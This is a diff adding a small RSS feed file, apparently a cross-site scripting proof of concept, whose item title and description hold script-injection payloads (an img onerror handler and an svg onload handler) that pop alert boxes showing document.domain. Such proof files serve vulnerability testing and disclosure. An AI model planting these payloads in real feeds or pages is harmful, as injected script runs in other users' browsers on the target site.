@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+  <channel>
+    <title>Harmonix News</title>
+    <item>
+      <title><![CDATA[<img src=x onerror=alert(document.domain)>]]></title>
+      <description><![CDATA[
+        <h1>New Track</h1>
+        <img src=x onerror="alert('H1:'+document.domain)">
+        <svg/onload=alert('H2:'+document.domain)>
+      ]]></description>
+      <link>https://www.harmonixmusic.com/</link>
+      <guid>poc-1</guid>
+    </item>
+  </channel>
+</rss>
